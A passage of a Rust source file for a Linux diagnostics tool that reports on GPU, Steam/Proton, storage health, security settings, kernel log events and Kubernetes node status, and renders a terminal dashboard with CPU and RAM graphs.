                    println!("{}", t!("gaming_prime_needed").to_string().yellow());
                }
                // Check for nvidia-settings
                if !is_command_available("nvidia-settings") {
                    println!(
                        "{}",
                        t!("gaming_nvidia_settings_missing").to_string().yellow()
                    );
                }
            }
            "amd" => {
                println!("{}", t!("gaming_amd_tip"));
            }
            "intel" => {
                println!("{}", t!("gaming_intel_tip"));
            }
            _ => {}
        }

        // Performance warnings
        if let Some(temp) = gpu.temperature {
            if temp > 80.0 {
                println!("{}", t!("gaming_gpu_hot_warning").to_string().red());
            }
        }
        if let Some(util) = gpu.memory_utilization() {
            if util > 85.0 {
                println!("{}", t!("gaming_vram_warning").to_string().yellow());
            }
        }
    }

    println!();

    // Steam-specific checks (only if Steam is installed)
    let steam_installed = is_command_available("steam");
    if steam_installed {
        println!("{}", t!("gaming_steam_installed").to_string().green());

        if metrics.steam_running {
            println!("{}", t!("gaming_steam_running").to_string().green());

            // Check for specific games
            if is_process_running("cs2") || is_process_running("csgo_linux64") {
                println!("{}", t!("gaming_cs2_detected").to_string().green());
                println!("{}", t!("gaming_cs2_tip"));
            }
        } else {
            println!("{}", t!("gaming_steam_not_running"));
        }

        // Proton
        if metrics.proton_failure_detected {
            println!("{}", t!("gaming_proton_errors").to_string().red());
            println!("{}", t!("gaming_proton_fix"));
        } else {
            println!("{}", t!("gaming_proton_ok").to_string().green());
        }

        // Check Proton version
        if let Some(proton_version) = detect_proton_version() {
            println!("{} {}", t!("gaming_proton_version"), proton_version);
        }
    } else {
        println!("{}", t!("gaming_steam_missing").to_string().yellow());
    }

    println!();
    println!("{}", t!("gaming_tip").bold());
    println!("{}", t!("gaming_launch_options"));
    Ok(())
}

fn why_storage(metrics: &Metrics) -> Result<()> {
    println!("{}", t!("storage_header").to_string().bold());
    let fs_label = metrics
        .filesystem
        .clone()
        .unwrap_or_else(|| "unknown".into());
    let overview = t!("storage_overview")
        .replace("{disk}", &format!("{:.1}", metrics.disk_full_percent))
        .replace("{fs}", &fs_label);
    println!("{overview}");

    let smart_header = t!("storage_smart_header").to_string();
    print_section(&smart_header, gather_smart_health());

    let raid_header = t!("storage_md_header").to_string();
    print_section(&raid_header, gather_mdraid_health());

    let btrfs_header = t!("storage_btrfs_header").to_string();
    print_section(&btrfs_header, gather_btrfs_health());

    let zfs_header = t!("storage_zfs_header").to_string();
    print_section(&zfs_header, gather_zfs_health());

    Ok(())
}

fn gather_smart_health() -> SectionResult {
    if !is_command_available("smartctl") {
        return Err(t!("storage_smart_missing").to_string());
    }

    let scan = Command::new("smartctl")
        .args(["--scan-open"])
        .output()
        .map_err(|_| t!("storage_smart_missing").to_string())?;
    if !scan.status.success() {
        return Err(String::from_utf8_lossy(&scan.stderr).trim().to_string());
    }

    let mut devices = Vec::new();
    for line in String::from_utf8_lossy(&scan.stdout).lines() {
        let device = line.split_whitespace().next().unwrap_or_default().trim();
        if device.is_empty() || device.starts_with('#') {
            continue;
        }
        devices.push(device.to_string());
    }
    devices.sort();
    devices.dedup();
    if devices.is_empty() {
        return Err(t!("storage_smart_no_devices").to_string());
    }

    let mut lines = Vec::new();
    for device in devices.into_iter().take(8) {
        let output = Command::new("smartctl").args(["-H", &device]).output();
        match output {
            Ok(out) if out.status.success() => {
                let text = String::from_utf8_lossy(&out.stdout).to_ascii_lowercase();
                let mut level = InsightLevel::Info;
                let mut status = "UNKNOWN".to_string();
                if text.contains("passed") {
                    level = InsightLevel::Good;
                    status = "PASSED".into();
                }
                if text.contains("failed") {
                    level = InsightLevel::Critical;
                    status = "FAILED".into();
                } else if text.contains("prefail") {
                    level = InsightLevel::Warning;
                    status = "PRE-FAIL".into();
                }
                lines.push(InsightLine {
                    level,
                    message: format!("{device}: SMART {status}"),
                });
            }
            Ok(out) => {
                let err = String::from_utf8_lossy(&out.stderr);
                let fallback = if err.trim().is_empty() {
                    "smartctl -H requires root privileges".into()
                } else {
                    err.trim().to_string()
                };
                lines.push(InsightLine {
                    level: InsightLevel::Warning,
                    message: format!("{device}: {fallback}"),
                });
            }
            Err(_) => lines.push(InsightLine {
                level: InsightLevel::Warning,
                message: format!("{device}: smartctl invocation failed"),
            }),
        }
    }
    Ok(lines)
}

fn gather_mdraid_health() -> SectionResult {
    let text =
        fs::read_to_string("/proc/mdstat").map_err(|_| t!("storage_mdstat_missing").to_string())?;
    let mut lines = Vec::new();
    for block in text.split("\n\n") {
        let mut parts = block.lines();
        let header = match parts.next() {
            Some(line) if line.starts_with("md") => line,
            _ => continue,
        };
        let name = header.split_whitespace().next().unwrap_or("md?");
        let normalized = block.to_ascii_lowercase();
        let missing =
            normalized.contains("_]") || normalized.contains("[u_") || normalized.contains("[__");
        let degraded = normalized.contains("degraded") || missing;
        let recovering = normalized.contains("recovery") || normalized.contains("resync");
        let level = if degraded {
            InsightLevel::Critical
        } else if recovering {
            InsightLevel::Warning
        } else {
            InsightLevel::Good
        };
        let detail = if degraded {
            "degraded"
        } else if recovering {
            "resync in progress"
        } else {
            "healthy"
        };
        lines.push(InsightLine {
            level,
            message: format!("{name}: {detail}"),
        });
    }
    if lines.is_empty() {
        Err(t!("storage_mdstat_clean").to_string())
    } else {
        Ok(lines)
    }
}

fn gather_btrfs_health() -> SectionResult {
    if !is_command_available("btrfs") {
        return Err(t!("storage_btrfs_missing").to_string());
    }
    let mounts = btrfs_mount_points();
    if mounts.is_empty() {
        return Err(t!("storage_btrfs_not_found").to_string());
    }

    let mut lines = Vec::new();
    for mount in mounts.into_iter().take(4) {
        let output = Command::new("btrfs")
            .args(["device", "stats", &mount])
            .output();
        match output {
            Ok(out) if out.status.success() => {
                let mut errors = Vec::new();
                for line in String::from_utf8_lossy(&out.stdout).lines() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() {
                        continue;
                    }
                    if let Some(value_token) = trimmed.split_whitespace().last() {
                        if let Ok(value) = value_token.parse::<u64>() {
                            if value > 0 {
                                errors.push(trimmed.to_string());
                            }
                        }
                    }
                }
                if errors.is_empty() {
                    lines.push(InsightLine {
                        level: InsightLevel::Good,
                        message: format!("{mount}: no device errors reported"),
                    });
                } else {
                    for err in errors {
                        lines.push(InsightLine {
                            level: InsightLevel::Warning,
                            message: format!("{mount}: {err}"),
                        });
                    }
                }
            }
            Ok(out) => {
                let err = String::from_utf8_lossy(&out.stderr);
                lines.push(InsightLine {
                    level: InsightLevel::Warning,
                    message: format!("{mount}: {}", err.trim()),
                });
            }
            Err(_) => lines.push(InsightLine {
                level: InsightLevel::Warning,
                message: format!("{mount}: btrfs device stats failed"),
            }),
        }
    }
    Ok(lines)
}

fn gather_zfs_health() -> SectionResult {
    if !is_command_available("zpool") {
        return Err(t!("storage_zfs_missing").to_string());
    }
    let output = Command::new("zpool").arg("status").output();
    let out = match output {
        Ok(out) if out.status.success() => out,
        Ok(out) => return Err(String::from_utf8_lossy(&out.stderr).trim().to_string()),
        Err(_) => return Err(t!("storage_zfs_missing").to_string()),
    };
    let text = String::from_utf8_lossy(&out.stdout);
    if text.to_ascii_lowercase().contains("no pools available") {
        return Err(t!("storage_zfs_clean").to_string());
    }
    #[derive(Default)]
    struct Pool {
        name: String,
        state: Option<String>,
        errors: Option<String>,
    }
    let mut pools = Vec::new();
    let mut current: Option<Pool> = None;
    for line in text.lines() {
        let trimmed = line.trim();
        if let Some(name) = trimmed.strip_prefix("pool:") {
            if let Some(pool) = current.take() {
                pools.push(pool);
            }
            current = Some(Pool {
                name: name.trim().to_string(),
                ..Default::default()
            });
        } else if let Some(state) = trimmed.strip_prefix("state:") {
            if let Some(pool) = current.as_mut() {
                pool.state = Some(state.trim().to_string());
            }
        } else if trimmed.starts_with("errors:") {
            if let Some(pool) = current.as_mut() {
                pool.errors = Some(trimmed["errors:".len()..].trim().to_string());
            }
        }
    }
    if let Some(pool) = current {
        pools.push(pool);
    }
    if pools.is_empty() {
        return Err(t!("storage_zfs_clean").to_string());
    }

    let mut lines = Vec::new();
    for pool in pools {
        let state = pool.state.unwrap_or_else(|| "unknown".into());
        let errors = pool.errors.unwrap_or_else(|| "unknown".into());
        let lower_state = state.to_ascii_lowercase();
        let mut level = if lower_state.contains("degraded")
            || lower_state.contains("fault")
            || lower_state.contains("offline")
            || lower_state.contains("unavail")
        {
            InsightLevel::Critical
        } else {
            InsightLevel::Good
        };
        if !errors.to_ascii_lowercase().contains("no known data errors")
            && !errors.eq_ignore_ascii_case("none")
            && !errors.eq_ignore_ascii_case("unknown")
        {
            if matches!(level, InsightLevel::Good) {
                level = InsightLevel::Warning;
            }
        }
        lines.push(InsightLine {
            level,
            message: format!("{}: state={} | errors={}", pool.name, state, errors),
        });
    }
    Ok(lines)
}

fn btrfs_mount_points() -> Vec<String> {
    let mut mounts = Vec::new();
    if let Ok(data) = fs::read_to_string("/proc/mounts") {
        for line in data.lines() {
            let mut parts = line.split_whitespace();
            let _device = match parts.next() {
                Some(value) => value,
                None => continue,
            };
            let mount_point = match parts.next() {
                Some(value) => value,
                None => continue,
            };
            let fs_type = match parts.next() {
                Some(value) => value,
                None => continue,
            };
            if fs_type == "btrfs" {
                mounts.push(mount_point.to_string());
            }
        }
    }
    mounts
}

fn why_security() -> Result<()> {
    println!("{}", t!("security_header").to_string().bold());

    let mac_header = t!("security_controls_header").to_string();
    let controls = vec![selinux_status_line(), apparmor_status_line()];
    print_section(&mac_header, Ok(controls));

    let firewall_header = t!("security_firewall_header").to_string();
    print_section(&firewall_header, gather_firewall_lines());

    let ports_header = t!("security_open_ports_header").to_string();
    print_section(&ports_header, gather_open_ports(8));

    Ok(())
}

fn selinux_status_line() -> InsightLine {
    if !is_command_available("getenforce") {
        return InsightLine {
            level: InsightLevel::Info,
            message: t!("security_selinux_missing").to_string(),
        };
    }
    let output = Command::new("getenforce").output();
    match output {
        Ok(out) if out.status.success() => {
            let state = String::from_utf8_lossy(&out.stdout).trim().to_string();
            let level = match state.to_ascii_lowercase().as_str() {
                "enforcing" => InsightLevel::Good,
                "permissive" => InsightLevel::Warning,
                _ => InsightLevel::Warning,
            };
            InsightLine {
                level,
                message: format!("SELinux: {state}"),
            }
        }
        Ok(out) => InsightLine {
            level: InsightLevel::Warning,
            message: format!("SELinux: {}", String::from_utf8_lossy(&out.stderr).trim()),
        },
        Err(_) => InsightLine {
            level: InsightLevel::Warning,
            message: "SELinux: unable to query state".into(),
        },
    }
}

fn apparmor_status_line() -> InsightLine {
    if !is_command_available("aa-status") {
        return InsightLine {
            level: InsightLevel::Info,
            message: t!("security_apparmor_missing").to_string(),
        };
    }
    let output = Command::new("aa-status").output();
    match output {
        Ok(out) if out.status.success() => {
            let text = String::from_utf8_lossy(&out.stdout);
            let enforced = text
                .lines()
                .find(|line| line.contains("profiles are in enforce mode"))
                .unwrap_or_default()
                .split_whitespace()
                .next()
                .unwrap_or("0")
                .to_string();
            InsightLine {
                level: InsightLevel::Good,
                message: format!("AppArmor: {enforced} profiles enforcing"),
            }
        }
        Ok(out) => InsightLine {
            level: InsightLevel::Warning,
            message: format!("AppArmor: {}", String::from_utf8_lossy(&out.stderr).trim()),
        },
        Err(_) => InsightLine {
            level: InsightLevel::Warning,
            message: "AppArmor: unable to query module".into(),
        },
    }
}

fn gather_firewall_lines() -> SectionResult {
    let mut lines = Vec::new();
    if let Some(line) = query_systemd_unit("firewalld", "firewalld") {
        lines.push(line);
    }
    if is_command_available("ufw") {
        let output = Command::new("ufw").arg("status").output();
        if let Ok(out) = output {
            let text = String::from_utf8_lossy(&out.stdout).to_ascii_lowercase();
            let active = text.contains("status: active");
            lines.push(InsightLine {
                level: if active {
                    InsightLevel::Good
                } else {
                    InsightLevel::Warning
                },
                message: format!("UFW: {}", if active { "active" } else { "inactive" }),
            });
        }
    }
    if is_command_available("nft") {
        if let Ok(out) = Command::new("nft").args(["list", "ruleset"]).output() {
            if out.status.success() {
                let text = String::from_utf8_lossy(&out.stdout);
                let has_rules = text.lines().any(|line| line.contains("table "));
                lines.push(InsightLine {
                    level: if has_rules {
                        InsightLevel::Good
                    } else {
                        InsightLevel::Warning
                    },
                    message: format!(
                        "nftables: {}",
                        if has_rules {
                            "rules present"
                        } else {
                            "no rules"
                        }
                    ),
                });
            }
        }
    }
    if lines.is_empty() {
        Err(t!("security_firewall_missing").to_string())
    } else {
        Ok(lines)
    }
}

fn gather_open_ports(limit: usize) -> SectionResult {
    if let Some(entries) = open_ports_from_ss(limit) {
        if entries.is_empty() {
            return Ok(vec![InsightLine {
                level: InsightLevel::Good,
                message: t!("security_open_ports_none").to_string(),
            }]);
        }
        return Ok(entries
            .into_iter()
            .map(|entry| InsightLine {
                level: InsightLevel::Info,
                message: entry,
            })
            .collect());
    }
    if let Some(entries) = open_ports_from_netstat(limit) {
        if entries.is_empty() {
            return Ok(vec![InsightLine {
                level: InsightLevel::Good,
                message: t!("security_open_ports_none").to_string(),
            }]);
        }
        return Ok(entries
            .into_iter()
            .map(|entry| InsightLine {
                level: InsightLevel::Info,
                message: entry,
            })
            .collect());
    }
    Err(t!("security_ports_tool_missing").to_string())
}

fn open_ports_from_ss(limit: usize) -> Option<Vec<String>> {
    if !is_command_available("ss") {
        return None;
    }
    let output = Command::new("ss").args(["-tulpn"]).output().ok()?;
    if !output.status.success() {
        return None;
    }
    let mut entries = Vec::new();
    for line in String::from_utf8_lossy(&output.stdout).lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 6 {
            continue;
        }
        let proto = parts[0];
        let local = parts[4];
        let process = parts.get(6).copied().unwrap_or("-");
        entries.push(format!("{proto:<4} {local:<30} {process}"));
        if entries.len() >= limit {
            break;
        }
    }
    Some(entries)
}

fn open_ports_from_netstat(limit: usize) -> Option<Vec<String>> {
    if !is_command_available("netstat") {
        return None;
    }
    let output = Command::new("netstat").args(["-tulpn"]).output().ok()?;
    if !output.status.success() {
        return None;
    }
    let mut entries = Vec::new();
    for line in String::from_utf8_lossy(&output.stdout).lines() {
        if line.starts_with("Proto") || line.trim().is_empty() {
            continue;
        }
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 7 {
            continue;
        }
        let proto = parts[0];
        let local = parts[3];
        let process = parts[6];
        entries.push(format!("{proto:<4} {local:<30} {process}"));
        if entries.len() >= limit {
            break;
        }
    }
    Some(entries)
}

fn query_systemd_unit(unit: &str, label: &str) -> Option<InsightLine> {
    if !is_command_available("systemctl") {
        return None;
    }
    let output = Command::new("systemctl")
        .args(["is-active", unit])
        .output()
        .ok()?;
    let text = if output.stdout.is_empty() {
        String::from_utf8_lossy(&output.stderr).trim().to_string()
    } else {
        String::from_utf8_lossy(&output.stdout).trim().to_string()
    };
    let active = output.status.success() && text == "active";
    let level = if active {
        InsightLevel::Good
    } else if text == "inactive" || text == "failed" {
        InsightLevel::Warning
    } else {
        InsightLevel::Info
    };
    Some(InsightLine {
        level,
        message: format!("{label}: {text}"),
    })
}

fn why_rca(metrics: &Metrics) -> Result<()> {
    println!("{}", t!("rca_header").to_string().bold());
    let uptime = Duration::from_secs(System::uptime());
    let summary = t!("rca_summary")
        .replace("{uptime}", &human_duration(uptime))
        .replace("{cpu}", &format!("{:.1}", metrics.cpu_usage))
        .replace("{ram}", &format!("{:.1}", metrics.mem_usage))
        .replace("{disk}", &format!("{:.1}", metrics.disk_full_percent));
    println!("{summary}");
    if let Some(last_boot) = last_boot_string() {
        println!("{} {last_boot}", t!("rca_last_boot"));
    }

    println!("\n{}", t!("rca_timeline_header").to_string().bold());
    if let Some(logs) = recent_logs() {
        let events = extract_rca_events(&logs);
        if events.is_empty() {
            println!("  {}", t!("rca_no_events").to_string().green());
        } else {
            for event in events {
                println!("  {}", stylize_insight(&event));
            }
        }
    } else {
        println!("  {}", t!("rca_logs_missing").to_string().yellow());
    }
    Ok(())
}

struct RcaPattern {
    label: &'static str,
    keywords: &'static [&'static str],
    level: InsightLevel,
}

const RCA_PATTERNS: &[RcaPattern] = &[
    RcaPattern {
        label: "OOM killer invoked",
        keywords: &["oom-killer", "out of memory"],
        level: InsightLevel::Critical,
    },
    RcaPattern {
        label: "Kernel panic / BUG",
        keywords: &["kernel panic", "fatal exception", "call trace", "bug:"],
        level: InsightLevel::Critical,
    },
    RcaPattern {
        label: "Hardware machine check",
        keywords: &["machine check", "mce:"],
        level: InsightLevel::Critical,
    },
    RcaPattern {
        label: "Thermal throttling",
        keywords: &["thermal throttling", "cpu thermal", "throttled"],
        level: InsightLevel::Warning,
    },
    RcaPattern {
        label: "GPU reset or fault",
        keywords: &["gpu hang", "gpu reset", "amdgpu", "i915 error"],
        level: InsightLevel::Warning,
    },
    RcaPattern {
        label: "Disk I/O errors",
        keywords: &["i/o error", "blk_update_request", "end_request"],
        level: InsightLevel::Critical,
    },
    RcaPattern {
        label: "Btrfs checksum errors",
        keywords: &["btrfs", "checksum error"],
        level: InsightLevel::Warning,
    },
    RcaPattern {
        label: "Watchdog reset",
        keywords: &["watchdog", "hard lockup", "soft lockup"],
        level: InsightLevel::Critical,
    },
];

fn extract_rca_events(logs: &str) -> Vec<InsightLine> {
    let mut events = Vec::new();
    for line in logs.lines().rev() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let lower = trimmed.to_ascii_lowercase();
        for pattern in RCA_PATTERNS {
            if pattern.keywords.iter().any(|needle| lower.contains(needle)) {
                events.push(InsightLine {
                    level: pattern.level,
                    message: format!("{} — {}", pattern.label, truncate(trimmed, 110)),
                });
                break;
            }
        }
        if events.len() >= RCA_EVENT_LIMIT {
            break;
        }
    }
    events
}

fn last_boot_string() -> Option<String> {
    let output = Command::new("who").arg("-b").output().ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout);
    text.lines()
        .next()
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
}

fn human_duration(duration: Duration) -> String {
    let seconds = duration.as_secs();
    let days = seconds / 86_400;
    let hours = (seconds % 86_400) / 3_600;
    let minutes = (seconds % 3_600) / 60;
    let mut parts = Vec::new();
    if days > 0 {
        parts.push(format!("{days}d"));
    }
    if hours > 0 {
        parts.push(format!("{hours}h"));
    }
    if minutes > 0 {
        parts.push(format!("{minutes}m"));
    }
    if parts.is_empty() {
        parts.push(format!("{}s", seconds));
    }
    parts.join(" ")
}

fn why_kube_node() -> Result<()> {
    println!("{}", t!("kube_node_header").to_string().bold());

    let kubelet_header = t!("kube_node_kubelet_header").to_string();
    print_section(&kubelet_header, Ok(vec![kubelet_status_line()]));

    let runtime_header = t!("kube_node_runtime_header").to_string();
    print_section(&runtime_header, gather_runtime_lines());

    let pressure_header = t!("kube_node_pressure_header").to_string();
    print_section(&pressure_header, gather_pressure_lines());

    let logs_header = t!("kube_node_kubelet_logs").to_string();
    print_section(&logs_header, gather_kubelet_warnings());

    let pods_header = t!("kube_node_pod_header").to_string();
    print_section(&pods_header, gather_problem_pods(8));

    Ok(())
}

fn kubelet_status_line() -> InsightLine {
    query_systemd_unit("kubelet", "kubelet").unwrap_or(InsightLine {
        level: InsightLevel::Info,
        message: t!("kube_node_kubelet_missing").to_string(),
    })
}

fn gather_runtime_lines() -> SectionResult {
    let mut lines = Vec::new();
    for (unit, label) in [
        ("containerd", "containerd"),
        ("crio", "crio"),
        ("docker", "dockerd"),
    ] {
        if let Some(line) = query_systemd_unit(unit, label) {
            lines.push(line);
        }
    }
    if lines.is_empty() {
        Err(t!("kube_node_runtime_missing").to_string())
    } else {
        Ok(lines)
    }
}

fn gather_pressure_lines() -> SectionResult {
    let mut lines = Vec::new();
    for resource in ["cpu", "memory", "io"] {
        if let Some((some, full)) = read_pressure(resource) {
            let mut message = format!(
                "{}: avg10={:.2}% avg60={:.2}% avg300={:.2}%",
                resource.to_uppercase(),
                some.avg10,
                some.avg60,
                some.avg300
            );
            if let Some(full_stats) = full {
                message.push_str(&format!(" | full avg10={:.2}%", full_stats.avg10));
            }
            let critical = some.avg10 > 0.80
                || full
                    .as_ref()
                    .map(|entry| entry.avg10 > 0.40)
                    .unwrap_or(false);
            let warning = some.avg10 > 0.30 || some.avg60 > 0.45;
            lines.push(InsightLine {
                level: if critical {
                    InsightLevel::Critical
                } else if warning {
                    InsightLevel::Warning
                } else {
                    InsightLevel::Info
                },
                message,
            });
        }
    }
    if lines.is_empty() {
        Err(t!("kube_node_pressure_missing").to_string())
    } else {
        Ok(lines)
    }
}

fn gather_kubelet_warnings() -> SectionResult {
    if !is_command_available("journalctl") {
        return Err(t!("kube_node_logs_missing").to_string());
    }
    let output = Command::new("journalctl")
        .args(["-u", "kubelet", "-p", "warning", "-n", "20", "--no-pager"])
        .output()
        .map_err(|_| t!("kube_node_logs_missing").to_string())?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    let lines: Vec<InsightLine> = String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter(|line| !line.trim().is_empty())
        .take(8)
        .map(|line| InsightLine {
            level: InsightLevel::Warning,
            message: truncate(line.trim(), 120),
        })
        .collect();
    if lines.is_empty() {
        Err(t!("kube_node_logs_clean").to_string())
    } else {
        Ok(lines)
    }
}

fn gather_problem_pods(limit: usize) -> SectionResult {
    if !is_command_available("kubectl") {
        return Err(t!("kube_node_pod_missing").to_string());
    }
    let output = Command::new("kubectl")
        .args(["get", "pods", "--all-namespaces", "--no-headers"])
        .output()
        .map_err(|_| t!("kube_node_pod_missing").to_string())?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    let mut lines = Vec::new();
    for line in String::from_utf8_lossy(&output.stdout).lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 5 {
            continue;
        }
        let status = parts[3];
        if status == "Running" || status == "Completed" {
            continue;
        }
        let namespace = parts[0];
        let name = parts[1];
        let ready = parts[2];
        let restarts = parts.get(4).copied().unwrap_or("0");
        lines.push(InsightLine {
            level: InsightLevel::Warning,
            message: format!(
                "{namespace}/{name} — status={status} ready={ready} restarts={restarts}"
            ),
        });
        if lines.len() >= limit {
            break;
        }
    }
    if lines.is_empty() {
        Err(t!("kube_node_pod_clean").to_string())
    } else {
        Ok(lines)
    }
}

#[derive(Clone, Copy)]
struct PressureSample {
    avg10: f32,
    avg60: f32,
    avg300: f32,
}

fn read_pressure(resource: &str) -> Option<(PressureSample, Option<PressureSample>)> {
    let path = format!("/proc/pressure/{resource}");
    let data = fs::read_to_string(path).ok()?;
    let mut some = None;
    let mut full = None;
    for line in data.lines() {
        if line.starts_with("some") {
            some = parse_pressure_line(line);
        } else if line.starts_with("full") {
            full = parse_pressure_line(line);
        }
    }
    some.map(|entry| (entry, full))
}

fn parse_pressure_line(line: &str) -> Option<PressureSample> {
    let mut avg10 = None;
    let mut avg60 = None;
    let mut avg300 = None;
    for token in line.split_whitespace() {
        if let Some(value) = token.strip_prefix("avg10=") {
            avg10 = value.parse::<f32>().ok();
        } else if let Some(value) = token.strip_prefix("avg60=") {
            avg60 = value.parse::<f32>().ok();
        } else if let Some(value) = token.strip_prefix("avg300=") {
            avg300 = value.parse::<f32>().ok();
        }
    }
    Some(PressureSample {
        avg10: avg10?,
        avg60: avg60?,
        avg300: avg300?,
    })
}

fn detect_proton_version() -> Option<String> {
    let mut home = user_home_dir()?;
    home.push(".steam/steam/steamapps/common");

    if let Ok(entries) = fs::read_dir(&home) {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with("Proton") {
                return Some(name_str.to_string());
            }
        }
    }
    None
}

fn is_safe_auto_fix(cmd: &str) -> bool {
    // Block shell metacharacters to prevent command injection
    const DANGEROUS_CHARS: &[char] = &[
        ';', '|', '&', '$', '`', '>', '<', '\n', '\r', '(', ')', '{', '}',
    ];

    if cmd.chars().any(|c| DANGEROUS_CHARS.contains(&c)) {
        return false;
    }

    let whitelist = [
        "bluetoothctl power off",
        "bluetoothctl power on",
        "snap remove",
        "flatpak uninstall",
        "balooctl",
        "systemctl --user",
        "docker image prune",
    ];

    // Check for exact match OR prefix with space (to allow arguments)
    whitelist
        .iter()
        .any(|allowed| cmd == *allowed || cmd.starts_with(&format!("{} ", allowed)))
}

fn recent_logs() -> Option<String> {
    LOG_CACHE.get_or_init(fetch_recent_logs).clone()
}

fn fetch_recent_logs() -> Option<String> {
    let journal = Command::new("journalctl")
        .args(["-n", "500", "--no-pager"])
        .output()
        .ok();
    if let Some(output) = journal {
        if output.status.success() {
            return Some(String::from_utf8_lossy(&output.stdout).into());
        }
    }
    let dmesg = Command::new("dmesg").output().ok()?;
    if dmesg.status.success() {
        return Some(String::from_utf8_lossy(&dmesg.stdout).into());
    }
    None
}

fn tui_mode() -> Result<()> {
    let rules = load_rules()?;
    let parsed_rules: Vec<(Vec<Condition>, Rule)> = rules
        .into_iter()
        .map(|rule| (parse_trigger(&rule.trigger), rule))
        .collect();
    let mut stdout = stdout();
    enable_raw_mode().context("Failed to enable raw mode")?;
    stdout
        .execute(EnterAlternateScreen)
        .context("Failed to switch screen")?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;
    let mut sys = System::new_all();

    // Cache GPU info and refresh every 5 seconds to avoid hammering GPU tools
    let mut gpu_cache: Option<GpuDetails> = None;
    let mut last_gpu_refresh = std::time::Instant::now();
    let gpu_refresh_interval = Duration::from_secs(5);

    // History for graphs (keep last 60 data points = 12 seconds at 200ms refresh)
    use std::collections::VecDeque;
    let mut cpu_history: VecDeque<u64> = VecDeque::with_capacity(60);
    let mut ram_history: VecDeque<u64> = VecDeque::with_capacity(60);

    loop {
        sys.refresh_all();

        // Refresh GPU info every 5 seconds
        if last_gpu_refresh.elapsed() >= gpu_refresh_interval {
            gpu_cache = detect_gpu_info();
            last_gpu_refresh = std::time::Instant::now();
        }

        let mut metrics = Metrics::gather(&sys);
        metrics.gpu = gpu_cache.clone();

        // Track CPU/RAM history for graphs
        cpu_history.push_back(metrics.cpu_usage as u64);
        ram_history.push_back(metrics.mem_usage as u64);
        if cpu_history.len() > 60 {
            cpu_history.pop_front();
        }
        if ram_history.len() > 60 {
            ram_history.pop_front();
        }

        let findings = evaluate_rules(&metrics, &parsed_rules);

        terminal.draw(|frame| draw_tui(frame, &metrics, &findings, &cpu_history, &ram_history))?;

        if event::poll(Duration::from_millis(200))? {
            if let Event::Key(key) = event::read()? {
                if key.code == KeyCode::Char('q') {
                    break;
                }
            }
        }
    }

    disable_raw_mode().context("Failed to disable raw mode")?;
    terminal
        .backend_mut()
        .execute(LeaveAlternateScreen)
        .context("Failed to leave alternate screen")?;
    Ok(())
}

fn draw_tui(
    frame: &mut Frame,
    metrics: &Metrics,
    findings: &[Finding],
    cpu_history: &std::collections::VecDeque<u64>,
    ram_history: &std::collections::VecDeque<u64>,
) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .margin(1)
        .constraints([
            Constraint::Length(7), // Graphs
            Constraint::Length(8), // Vitals
            Constraint::Min(10),   // Findings
        ])
        .split(frame.area());

    // Graph section (split horizontally for CPU and RAM)
    let graph_chunks = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(50), Constraint::Percentage(50)])
        .split(chunks[0]);

    // CPU sparkline
    let cpu_data: Vec<u64> = cpu_history.iter().copied().collect();
    let cpu_sparkline = Sparkline::default()
        .block(
            Block::default()
                .title(format!("CPU: {:.1}%", metrics.cpu_usage))
                .borders(Borders::ALL),
        )
        .data(&cpu_data)
        .style(ratatui::style::Style::default().fg(ratatui::style::Color::Green));
    frame.render_widget(cpu_sparkline, graph_chunks[0]);

    // RAM sparkline
    let ram_data: Vec<u64> = ram_history.iter().copied().collect();
    let ram_sparkline = Sparkline::default()
        .block(
            Block::default()
                .title(format!("RAM: {:.1}%", metrics.mem_usage))
                .borders(Borders::ALL),
        )
        .data(&ram_data)
        .style(ratatui::style::Style::default().fg(ratatui::style::Color::Cyan));
    frame.render_widget(ram_sparkline, graph_chunks[1]);

    // Vitals section
    let stats = format!(
        "Disk: {disk:.1}%\nTemp: {temp}\nFan: {fan}\nGPU: {gpu}",
        disk = metrics.disk_full_percent,
        temp = metrics
            .temperature_c
            .map(|t| format!("{t:.1}°C"))
            .unwrap_or_else(|| "n/a".into()),
        fan = metrics
            .fan_speed_rpm
            .map(|f| format!("{f:.0} RPM"))
            .unwrap_or_else(|| "n/a".into()),
        gpu = metrics
            .gpu
            .as_ref()
            .and_then(|g| g.temperature)
            .map(|t| format!("{t:.1}°C"))
            .unwrap_or_else(|| "n/a".into()),
    );

    let stats_block =
        Paragraph::new(stats).block(Block::default().title("Vitals").borders(Borders::ALL));
    frame.render_widget(stats_block, chunks[1]);

    // Findings section
    let mut list = String::new();
    for finding in findings.iter().take(8) {
        list.push_str(&format!(
            "{} — {}\n{}\n\n",
            finding.severity, finding.message, finding.solution
        ));
    }
    if list.is_empty() {
        list.push_str(&t!("all_good"));
    }

    let findings_block =
        Paragraph::new(list).block(Block::default().title("Findings").borders(Borders::ALL));
    frame.render_widget(findings_block, chunks[2]);
}

fn user_home_dir() -> Option<PathBuf> {
    env::var("HOME")
        .map(PathBuf::from)
        .ok()
        .or_else(|| env::var("USERPROFILE").map(PathBuf::from).ok())
}

const RULES_PATH: &str = "rules.toml";

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_trigger_single_condition() {
        let conditions = parse_trigger("cpu>60");
        assert_eq!(conditions.len(), 1);
        match &conditions[0] {
            Condition::CpuGreater(val) => assert_eq!(*val, 60.0),
            _ => panic!("Expected CpuGreater condition"),
        }
    }

    #[test]
    fn test_parse_trigger_multiple_conditions() {
        let conditions = parse_trigger("cpu>80 && mem>90");
        assert_eq!(conditions.len(), 2);
        match &conditions[0] {
            Condition::CpuGreater(val) => assert_eq!(*val, 80.0),
